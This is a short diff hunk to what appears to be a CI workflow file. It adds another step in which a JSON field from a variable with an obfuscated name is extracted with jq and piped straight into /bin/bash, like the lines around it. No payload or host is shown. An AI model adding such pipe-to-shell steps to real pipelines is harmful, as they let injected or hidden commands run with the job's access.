@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$iep0" | jq -r .ejis803 | /bin/bash
           printf '%s' "$dfysa60" | jq -r .mzr1747 | /bin/bash
           echo $o4 | jq -r .jmjfg23 | /bin/bash
+          echo $iiyva0313 | jq -r .stw05 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
